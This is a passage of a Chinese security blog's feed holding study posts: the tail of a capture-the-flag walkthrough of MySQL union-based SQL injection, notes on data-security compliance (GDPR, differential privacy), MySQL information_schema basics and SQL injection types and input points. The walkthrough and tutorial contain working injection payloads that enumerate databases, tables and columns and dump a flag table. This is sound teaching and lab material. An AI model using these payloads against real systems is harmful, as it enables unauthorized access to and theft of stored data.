title="5.获取所有数据库名"></a>5.获取所有数据库名</h4><p>&emsp;&emsp;可以通过使用注入查询数据库语句显示当前所有数据库： databas()</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,(select group_concat(schema_name) from information_schema.schemata)%23</span><br></code></pre></td></tr></table></figure><p><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/7.png"></p><p>&emsp;&emsp;可以看见，输入完毕后，第三行会将所存在的数据库输出到显示屏中    </p><p>&emsp;</p><h4 id="6-获取表名"><a href="#6-获取表名" class="headerlink" title="6.获取表名"></a>6.获取表名</h4><p>&emsp;&emsp;在获取数据库的信息后，查找对应数据库里所拥有的表：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>mysql<span class="hljs-string">&#x27;),3%23</span><br></code></pre></td></tr></table></figure><p><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/8.png"></p><p>&emsp;&emsp;’mysql’为数据库名，通过改变数据库名，进行不同数据库的内容查询</p><p>&emsp;</p><h4 id="7-获列名"><a href="#7-获列名" class="headerlink" title="7.获列名"></a>7.获列名</h4><p>&emsp;&emsp;查看表的内容</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;</span>note<span class="hljs-string">&#x27; and table_name=&#x27;</span>fl4g<span class="hljs-string">&#x27;),3%23</span><br></code></pre></td></tr></table></figure><p><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/9.png"></p><h4 id="8-获取列中的信息"><a href="#8-获取列中的信息" class="headerlink" title="8.获取列中的信息"></a>8.获取列中的信息</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,group_concat(fllllag),3 from fl4g%23</span><br></code></pre></td></tr></table></figure><p><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/10.png"></p><p>&emsp;&emsp;最终获得flag</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>数据安全技术前沿研究笔记（二）</title>
    <link href="/2022/08/06/%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%97%A5%E8%AE%B0%E5%85%AD/"/>
    <url>/2022/08/06/%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%97%A5%E8%AE%B0%E5%85%AD/</url>
    
    <content type="html"><![CDATA[<h1 id="数据安全技术前沿研究笔记（二）"><a href="#数据安全技术前沿研究笔记（二）" class="headerlink" title="数据安全技术前沿研究笔记（二）"></a>数据安全技术前沿研究笔记（二）</h1><h4 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h4><p>&emsp;&emsp;由于第二章没啥好总结的，大多都是一些合规下数据安全类的文字阐述，和第一章的中心思路基本不差，我们就直接开始第三章的“前沿技术赋能用户隐私数据安全合规”。在该文章中，企业的用户隐私数据安全合规场景主要是是三种典型也对应了三种前沿技术（差分隐私、知识图谱和流程自动化）</p><p>&emsp;&emsp;（以下是第三章的部分摘抄）</p><p>&emsp;</p><h4 id="2-数据采集中隐私保护"><a href="#2-数据采集中隐私保护" class="headerlink" title="2.数据采集中隐私保护"></a>2.数据采集中隐私保护</h4><ul><li><h6 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h6></li></ul><p>&emsp;&emsp;在保护用户的个人隐私前提下，对大量用户的隐私数据进行采集，在服务器中完成数据的聚合和分析,挖掘大规模用户数据的整体趋势和统计信息。</p><ul><li><h6 id="合约条款"><a href="#合约条款" class="headerlink" title="合约条款"></a>合约条款</h6></li></ul><p>&emsp;&emsp;GDPR：为了应对隐私问题带来的风险的挑战，GDPR 指出数据控制者与处理者“应当执行合适的技术措施和有组织性的措施来保证合理应对风险的安全水平”。</p><p>&emsp;&emsp;《网络安全法》：“网络运营者应当采取技术措施和其他必要措施，确保其收集的个人信息安全，防止信息泄露、毁损、丢失”。即要求企业采取一定的技术与管理措施，确保用户个人信息与隐私安全。</p><ul><li><h6 id="挑战"><a href="#挑战" class="headerlink" title="挑战"></a>挑战</h6></li></ul><p>&emsp;&emsp;在传统的数据安全处理技术——去标识化（数据脱敏），在企业部分主要场景中一般可应对合规性，符合GDPR和《网络安全法》要求采取的必要措施。但是，在一些内部环境（如大部分内部用户可以访问和下载）或外部共享环境总，它处理后的数据仍然面临多种多样的隐私攻击，包括背景知识攻击、差分攻击和重标识攻击等。经过攻击后，个人隐私仍然有可能会被泄露，若对数据进行多度脱敏，虽然数据的隐私攻击风险降低，但数据的可用性也就大幅度降低。如何有效的防范隐私攻击又保留数据的可用性，也就是获取数据的聚合信息但无法获得单个记录的信息，这就是需要更高的技术。</p><ul><li><h6 id="对应技术"><a href="#对应技术" class="headerlink" title="对应技术"></a>对应技术</h6></li></ul><p>&emsp;&emsp;差分隐私</p><p>&emsp;</p><h4 id="3-个人信息治理与可视化"><a href="#3-个人信息治理与可视化" class="headerlink" title="3.个人信息治理与可视化"></a>3.个人信息治理与可视化</h4><ul><li><h6 id="背景-1"><a href="#背景-1" class="headerlink" title="背景"></a>背景</h6></li></ul><p>&emsp;&emsp;同一个企业的多个应用中，可能通过收集用户的多个 维度的个人信息与隐私数据。 此外，数据采集可能分布存储在多种多个数据库（ 如Oracle、MySQL/ElasticSearch）以及各种大数据平台中（HDFS 和 Hbase）。企业需要摸清企业内部有多少个独立的数据实体（数据主体），每一个实体包括哪些数据与属性维度，这些数据分别存储在哪些系统中和业务应用，以及数据共享给哪些第三方企业。</p><ul><li><h6 id="合约条款-1"><a href="#合约条款-1" class="headerlink" title="合约条款"></a>合约条款</h6></li></ul><p>&emsp;&emsp;GDPR：如 1.2.2 节所述，GDPR 赋予了用户知情权、访问权、修改权、限制处理权、 被遗忘权、可携带权、拒绝权等多项权利。相应地，企业必须履行和响应用户提出的权利请求。比如用户发起数据查看请求，那么企业必须完整呈现数据主体个人数据报告，包括收集了用户哪些结构化数据、哪些非结构化数据（包括网络浏览、点击等信息）、以及将数据共享给了哪些第三方企业。企业在实施用户权利请求响应的合规，个人信息治理与可视化是实现目标的关键。</p><p>&emsp;&emsp;《网络安全法》：如 1.2.2 节所述，法规赋予了用户一定程度的“删除权”和“修改权”，响应地，企业须履行和配合用户完成数据权利请求的流程。同样地，企业在具体实施合规落地时，个人信息治理与可视化是基础与前提。</p><ul><li><h6 id="挑战-1"><a href="#挑战-1" class="headerlink" title="挑战"></a>挑战</h6></li></ul><p>&emsp;&emsp;多源异构数据源分布同一个使用主体的信息和维度，对于企业复杂多变的数据环境来说，不同数据源实体ID表示显示不同或者缺失，如何识别与关联同一个实体是一个不小的挑战。</p><ul><li><h6 id="对应技术-1"><a href="#对应技术-1" class="headerlink" title="对应技术"></a>对应技术</h6></li></ul><p>&emsp;&emsp;知识图谱</p><p>&emsp;</p><h4 id="4-用户数据权利全球响应"><a href="#4-用户数据权利全球响应" class="headerlink" title="4.用户数据权利全球响应"></a>4.用户数据权利全球响应</h4><ul><li><h6 id="背景-2"><a href="#背景-2" class="headerlink" title="背景"></a>背景</h6></li></ul><p>&emsp;&emsp;全球一些隐私法规赋予数据主体（用户）自由访问、修改和删除个人数据等权利，相应地，要求企业必须在规定的时间内对用户提出的请求进行响应，比如向用户提供收集个人数据明细及使用目的报告。</p><ul><li><h6 id="合约条款-2"><a href="#合约条款-2" class="headerlink" title="合约条款"></a>合约条款</h6></li></ul><p>&emsp;&emsp;GDPR：规定企业“必须在一个月内对所有的请求进行响应和处理，若请求过于复杂，可延长至“两个月”。</p><p>&emsp;&emsp;《网络安全法》：法规赋予了用户一定程度的“删除权”和“修改权”，但未具体到响应时间的规定。但在国家标准《个人信息安全规范》（GB/T 35273-2020），明确规定从请求到响应的时间是 30 天内。</p><ul><li><h6 id="挑战-2"><a href="#挑战-2" class="headerlink" title="挑战"></a>挑战</h6></li></ul><p>&emsp;&emsp;许多企业无法应对数据主体权利请求，约有三分之二企业对当个SSR的回复需要出国两周以上的时间，且这些流程通常是人工完成，平均成本很高。因此，对于拥有一定用户数量规模的企业，如何应对多个用户并发请求的随时响应。</p><ul><li><h6 id="应对技术"><a href="#应对技术" class="headerlink" title="应对技术"></a>应对技术</h6></li></ul><p>&emsp;&emsp;流程自动化</p><p>&emsp;</p>]]></content>
    
    
    <categories>
      
      <category>实习之数据安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入——MySQL</title>
    <link href="/2022/08/05/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94MySQL/"/>
    <url>/2022/08/05/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94MySQL/</url>
    
    <content type="html"><![CDATA[<h1 id="SQL注入——MySQL"><a href="#SQL注入——MySQL" class="headerlink" title="SQL注入——MySQL"></a>SQL注入——MySQL</h1><h4 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h4><p>&emsp;&emsp;由于数据库的类型中，MySQL类型数据库是比较主流的，所以需要了解一些MySQL的相关知识。</p><p><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94MySQL/1.png"></p><p>&emsp;&emsp;(图片的蓝框部分打错了，懂意思就是，懒得改了)</p><p>&emsp;&emsp;可以看到在MYSQL5.0以上版本中，存在着名为information_schema的库，在这个库中存储记录了所有数据库名，表名，列名。也就一般来说我们可以通过查询它获取指定数据库下面的表名或者列名信息。而在数据库中符号“.”代表下一级，譬如liaoyue.use代表的意思是liaoyue数据下名为user的表。这都是要掌握的相关知识。</p><p>&emsp;</p><h4 id="2-MySQL-5-x结构"><a href="#2-MySQL-5-x结构" class="headerlink" title="2.MySQL 5.x结构"></a>2.MySQL 5.x结构</h4><ol><li>在MySQL 5.0以上版本中，为了方便管理，默认定义了information_schema数据 库，用来存储数据库元信息，其中具有表schemata（数据库名），table（表名），columns（列名或字段名）</li><li>在schemata表中，schema_name字段用来存储数据库名</li><li>在table表中，table_schema和table_name分别用来存储数据库名和表名</li><li>在column表中，table_schema（数据库名），table_name（表名），column_name（字段名）</li></ol><p>&emsp;</p><h4 id="3-常用的相关参数"><a href="#3-常用的相关参数" class="headerlink" title="3.常用的相关参数"></a>3.常用的相关参数</h4><ul><li>information_schema.tables：记录所有表名信息的表</li><li>information_schema.columns：记录所有列名信息的表</li><li>table_name：表名</li><li>column_name：列名</li><li>table_schema：数据库名</li><li>user()  查看当前MySQL登录的用户名</li><li>database()   查看当前使用MySQL数据库名</li><li>version()  查看当前MySQL版本</li></ul><p>&emsp;</p><h4 id="4-对数据库的增删改查"><a href="#4-对数据库的增删改查" class="headerlink" title="4.对数据库的增删改查"></a>4.对数据库的增删改查</h4><ul><li><p>增  create database 数据库名</p></li><li><p>删  drop database 数据库名</p></li><li><p>改  rename database 旧名 to 新名</p></li><li><p>查  show databases</p></li><li><p>创建表 create table table_name( id1 int,id2 varcher)</p></li><li><p>重新给表命名 alter table table_name_old rename as table_name_new</p></li></ul><ol><li>&emsp;</li></ol><h4 id="5-对数据表的增删改查"><a href="#5-对数据表的增删改查" class="headerlink" title="5.对数据表的增删改查"></a>5.对数据表的增删改查</h4><ul><li>  a. 增    insert into table_name(列1，列2 … ) values(值1，值2 … )</li><li>  b. 删    delete from 表名 where 列名 = 值</li><li>  c. 改    update 表名 set 列名=新值 where 列名=某值</li><li>  d. 查    select * from 表名 where 字段1=‘条件一’and 字段2 =‘条件二’</li><li>e. 扩展 limitl&emsp;&emsp;(imit m,n 从m行开始，到m+n行结束)<br>select * from admin limit 2,1 指的是 从第二行开始，到第三行结束</li></ul><p>&emsp;</p><p>(还有一些比较杂的内容，没想好怎么更新，晚点再回来写吧)</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入——类型及提交方法</title>
    <link href="/2022/08/05/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E7%B1%BB%E5%9E%8B%E5%8F%8A%E6%8F%90%E4%BA%A4%E6%96%B9%E6%B3%95/"/>
    <url>/2022/08/05/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E7%B1%BB%E5%9E%8B%E5%8F%8A%E6%8F%90%E4%BA%A4%E6%96%B9%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h1 id="SQL注入——类型及提交方法"><a href="#SQL注入——类型及提交方法" class="headerlink" title="SQL注入——类型及提交方法"></a>SQL注入——类型及提交方法</h1><h4 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h4><p>&emsp;&emsp;在现实的SQL注入安全测试中，我们首先要明确提交数据及提交方法后再进行相关的注入，其中提交数据类型和提交方法可以通过抓包分析获取，后续的安全测试中我们也必须满足同等的操作才能进行注入。</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E7%B1%BB%E5%9E%8B%E5%8F%8A%E6%8F%90%E4%BA%A4%E6%96%B9%E6%B3%95/1.png" style="zoom:67%;" /></center><p>&emsp;</p><h4 id="2-数据类型"><a href="#2-数据类型" class="headerlink" title="2.数据类型"></a>2.数据类型</h4><ul><li>数字型语句：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id  <br></code></pre></td></tr></table></figure><ul><li>字符型语句：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> name <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;liaoyue&#x27;</span><br></code></pre></td></tr></table></figure><ul><li>搜索型语句：（like）</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> name <span class="hljs-keyword">like</span> ‘<span class="hljs-operator">%</span>liaoyue<span class="hljs-operator">%</span>’<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> name <span class="hljs-keyword">like</span>  (’<span class="hljs-operator">%</span>xihua<span class="hljs-operator">%</span>’)<br></code></pre></td></tr></table></figure><p>&emsp;&emsp;通过三种语句的对比可以看见，在字符型语句中变量是需要使用到引号的，而在搜索类型中则需要注释单引号’、百分号%、括号等，这个需要自己进行多次尝试，搜索语句的类型并不多。因此我们的参数值在注入的时候需要去注意类型的判别。</p><p>&emsp;&emsp;json类型：</p><h4 id="3-请求方法"><a href="#3-请求方法" class="headerlink" title="3.请求方法"></a>3.请求方法</h4><p>&emsp;&emsp;不同的请求方式，上传的数据类型和大小是有区别的。我们不在上传的时候要根据请求的发送进行提交相关的语句，因此同的请求方法可能会有着不同注入的写法和方式。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$get</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;g&#x27;</span>];       <span class="hljs-comment">//get接受参数名为g的值赋值给变量get</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$get</span>;             <span class="hljs-comment">//输出变量g的数据</span><br><br><span class="hljs-variable">$post</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;p&#x27;</span>];     <span class="hljs-comment">//post接受参数名为p的值赋值给变量post</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$post</span>;            <span class="hljs-comment">//输出变量p的数据</span><br><br><span class="hljs-variable">$c</span>=<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$c</span>;<br><br><span class="hljs-variable">$r</span>=<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;r&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$r</span>;<br> <br><span class="hljs-variable">$s</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_USER_AGENT&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$s</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>&emsp;&emsp;（注：在java、python等语言的框架中基本也是一样的思路，只是写法可能会有细微的出入）</p><ul><li><h5 id="GET与POST："><a href="#GET与POST：" class="headerlink" title="GET与POST："></a>GET与POST：</h5></li></ul><p>&emsp;&emsp;我们尝试发送数据<a href="http://127.0.0.1/liaoyue.php/?g=123&amp;p=456">http://127.0.0.1/liaoyue.php/?g=123&amp;p=456</a></p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E7%B1%BB%E5%9E%8B%E5%8F%8A%E6%8F%90%E4%BA%A4%E6%96%B9%E6%B3%95/2.jpg" style="zoom:67%;" /></center><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E7%B1%BB%E5%9E%8B%E5%8F%8A%E6%8F%90%E4%BA%A4%E6%96%B9%E6%B3%95/3.jpg" alt="3" style="zoom: 67%;" /></center>&emsp;&emsp;可以看见，在数据包传输过后，界面显示的只有g的内容，p的内容传送失败了。这是因为在burp的抓包中，我们的数据是用GET的形式去请求的，而p是用POST进行接收，所以p并没有接收最终导致了只有g的内容被打印出来。<p>&emsp;&emsp;接下来修改传送方法，通过火狐插件 HackBar 在post提交p。</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E7%B1%BB%E5%9E%8B%E5%8F%8A%E6%8F%90%E4%BA%A4%E6%96%B9%E6%B3%95/6.jpg" style="zoom:67%;" /></center><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E7%B1%BB%E5%9E%8B%E5%8F%8A%E6%8F%90%E4%BA%A4%E6%96%B9%E6%B3%95/4.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;最终效果：</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E7%B1%BB%E5%9E%8B%E5%8F%8A%E6%8F%90%E4%BA%A4%E6%96%B9%E6%B3%95/5.jpg" style="zoom: 67%;" /></center>&emsp;&emsp;成功显示123456，在网址后面传参为get请求，不论是否为POST的请求类型，主要是在网址后面，get就能接收到，所以这样子用了POST的请求方式可以同时把GET和POST两个参数都传上去。<center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E7%B1%BB%E5%9E%8B%E5%8F%8A%E6%8F%90%E4%BA%A4%E6%96%B9%E6%B3%95/6.jpg" style="zoom: 60%;" /></center><p>&emsp;&emsp;这也就是说我们注入的位置是有要求和限制的，不同的请求方式会导致我们注入位置形成影响</p><ul><li><h5 id="COOKIE"><a href="#COOKIE" class="headerlink" title="COOKIE"></a>COOKIE</h5></li></ul><p>&emsp;&emsp;首先明确cookie并不是请求方法，是在数据包中cookie可以通过修改数据包中的cookie进行注入</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E7%B1%BB%E5%9E%8B%E5%8F%8A%E6%8F%90%E4%BA%A4%E6%96%B9%E6%B3%95/7.jpg" style="zoom: 100%;" /></center><ul><li><h5 id="REQUEST"><a href="#REQUEST" class="headerlink" title="REQUEST"></a>REQUEST</h5></li></ul><p>&emsp;&emsp;既可以通过GET请求，也可以通过POST请求，基本可以说可以REQUST能在所有方法的位置提交。</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E7%B1%BB%E5%9E%8B%E5%8F%8A%E6%8F%90%E4%BA%A4%E6%96%B9%E6%B3%95/8.jpg" style="zoom: 100%;" /></center><p>&emsp;&emsp;当然，在post请求的方法中也只是将位置接在post传输的数据后面，其他没有区别。</p><ul><li><h5 id="HTTP-头"><a href="#HTTP-头" class="headerlink" title="HTTP 头"></a>HTTP 头</h5></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#$_SERVER详解</span><br><span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_ACCEPT_LANGUAGE&#x27;</span>]       <span class="hljs-comment">//浏览器语言 </span><br><span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]               <span class="hljs-comment">//当前用户 IP</span><br><span class="hljs-comment">#其余的相关内容可以参考网站：https://www.cainiaoxueyuan.com/bc/9910.html</span><br></code></pre></td></tr></table></figure><p>&emsp;&emsp;测试网址：<a href="http://ip.tool.chinaz.com/">http://ip.tool.chinaz.com/</a></p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E7%B1%BB%E5%9E%8B%E5%8F%8A%E6%8F%90%E4%BA%A4%E6%96%B9%E6%B3%95/9.jpg" style="zoom: 100%;" /></center><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E7%B1%BB%E5%9E%8B%E5%8F%8A%E6%8F%90%E4%BA%A4%E6%96%B9%E6%B3%95/10.jpg" style="zoom: 100%;" /></center>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入——基础知识</title>
    <link href="/2022/08/04/SQL%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    <url>/2022/08/04/SQL%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    
    <content type="html"><![CDATA[<h1 id="SQL注入——基础知识"><a href="#SQL注入——基础知识" class="headerlink" title="SQL注入——基础知识"></a>SQL注入——基础知识</h1><h4 id="1-SQL的简介"><a href="#1-SQL的简介" class="headerlink" title="1.SQL的简介"></a>1.SQL的简介</h4><p>&emsp;&emsp;SQL (结构化查询语言) 是用于管理关系数据库管理系统（RDBMS）。 SQL 的范围包括数据插入、查询、更新和删除，数据库模式创建和修改，以及数据访问控制。</p><p>&emsp;&emsp;虽然存在着不同版本的SQL语言，但是为了ANSI标准的兼容性，它们必须以相似的方式来支持一些主要的命令（SELECT、UPDATE、DELETE、INSERT、WHERE 等等），当然除了这些标准外，大部分SQL数据库都拥有它们自己的专有扩展。</p><p>&emsp;</p><h4 id="2-SQL注入的定义"><a href="#2-SQL注入的定义" class="headerlink" title="2.SQL注入的定义"></a>2.SQL注入的定义</h4><p>&emsp;&emsp;SQL 注入是一种非常常见的数据库攻击手段，是一种通过操作输入来修改后台SQL语句达到代码执行进行攻击目的的技术。</p><p>&emsp;</p><h4 id="3-SQL注入的原理"><a href="#3-SQL注入的原理" class="headerlink" title="3.SQL注入的原理"></a>3.SQL注入的原理</h4><p>&emsp;&emsp;web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句]，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。</p><p>&emsp;&emsp;（简单来说就是利用查库的变量伪造出数据库的语句进行增删改查的操作，一般查的实现比较多，所以能够泄漏得到数据库的信息）</p><center><img src="/img/SQL%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/1-16602818120541.png" style="zoom:100%;" /></center><p>&emsp;</p><h4 id="4-SQL注入的种类"><a href="#4-SQL注入的种类" class="headerlink" title="4.SQL注入的种类"></a>4.SQL注入的种类</h4><ol><li>注入手法分类：<ul><li>联合查询注入</li><li>报错型注入</li><li>布尔型注入</li><li>延时注入</li><li>堆叠注入</li></ul></li><li>数据类型分类：<ul><li>字符型</li><li>数值型</li></ul></li><li>注入位置分类：<ul><li>GET数据（地址栏）</li><li>POST数据（输入框）</li><li>HTTP头部</li><li>Cookie数据</li></ul></li></ol><p>&emsp;</p><h4 id="5-SQL注入的危害"><a href="#5-SQL注入的危害" class="headerlink" title="5.SQL注入的危害"></a>5.SQL注入的危害</h4><ol><li>访问数据库数据，盗取信息</li><li>对数据库进行增删改查</li><li>如果网站目录存在写入权限，可以写入网页木马</li><li>提权</li><li>等等</li></ol><p>&emsp;</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>数据安全技术前沿研究笔记（一）</title>
    <link href="/2022/08/04/%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%97%A5%E8%AE%B0%E4%BA%94/"/>
    <url>/2022/08/04/%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%97%A5%E8%AE%B0%E4%BA%94/</url>
    
    <content type="html"><![CDATA[<h1 id="数据安全技术前沿研究笔记（一）"><a href="#数据安全技术前沿研究笔记（一）" class="headerlink" title="数据安全技术前沿研究笔记（一）"></a>数据安全技术前沿研究笔记（一）</h1><h4 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h4><p>&emsp;&emsp;最近在看绿盟出的《拥抱合规、超越合规：数据安全技术前沿研究报告》，书是本好书，接下来也会分享自己的阅读笔记，但是这个名字又臭又长是谁想出来的。对于后续的技术学习其实我心里也没什么底，毕竟差分计算，联邦学习有接触过，感觉挺难的，冲！</p><p>&emsp;</p><h4 id="2-为什么要关注数据安全"><a href="#2-为什么要关注数据安全" class="headerlink" title="2.为什么要关注数据安全"></a>2.为什么要关注数据安全</h4><p>&emsp;&emsp;现在随着时代的发展，在大数据时代，数据的作用和重要性越来越大，数据的国家战略性资源地位也被确立。但是近年来，大规模的数据泄露事件频频发生。”大数据杀熟“、数据歧视、个人信息非法采集和窃取等现象发生得越来越多。因此，为了应对这种挑战，全国掀起了数据安全与隐私的立法和技术热潮。（可以看数据安全的第一篇文章，里面就摘抄出了很多不同国家不同机构出台的数据安全法律法规）</p><p>&emsp;&emsp;随着安全的重视，许多国家陆陆续续的出台了比较具有代表性的法案。欧盟的《通用数据保护条例》（GDPR）、美国的《加州消费者隐私法案》（CCPA）以及我国基于总体国家安全观指导下的《数据安全法》和对公民隐私和个人信息进行安全保护的《个人信息保护法》。</p><p>&emsp;</p><h4 id="3-为什么要先关注数据安全的法律"><a href="#3-为什么要先关注数据安全的法律" class="headerlink" title="3.为什么要先关注数据安全的法律"></a>3.为什么要先关注数据安全的法律</h4><p>&emsp;&emsp;全国数据安全法规的监管在不断的完善，这就涉及到了一个合规性的问题，企业的建设是否符合要求，重要的数据是否得到保护，这都是我们需要研究的的问题。在绿盟的这本书中，主要是针对用户隐私数据安全合规、企业内部数据安全治理和企业间数据安全共享与计算进行合规需求的梳理分析，同时选取了十周种比较前言的数据安全技术手段进行讲解好分析（一开始粗略瞅了一眼，看得头皮发麻）</p><p>&emsp;&emsp;其实，一开始给自己的定位是作为一个追求技术操作，但是如果没有法律法规的铺垫和研究，我们没办法明白我们最终技术所要实现的目标和作用，所以阅读法律法规是比较有必要的事情。</p><p>&emsp;</p><h4 id="4-国内外立法与执法趋势"><a href="#4-国内外立法与执法趋势" class="headerlink" title="4.国内外立法与执法趋势"></a>4.国内外立法与执法趋势</h4><h6 id="国外："><a href="#国外：" class="headerlink" title="国外："></a>国外：</h6><p>&emsp;&emsp;在立法方面，比较有代表性的就算欧盟2018年5月25日实施的《通用数据保护条例》（GDPR），在该条例的影响下，其他国家也陆陆续续推出了各自相关的法案。</p><p>&emsp;&emsp;在执法方面，欧盟由于立法比较早，所以相较于其他国家而言，欧盟已经进入到了全面执法的阶段并开出了违反GDPR的相关罚单（比如英国航空公司的1.83亿英镑和万豪国际集团的9900万英镑）。</p><h6 id="国内："><a href="#国内：" class="headerlink" 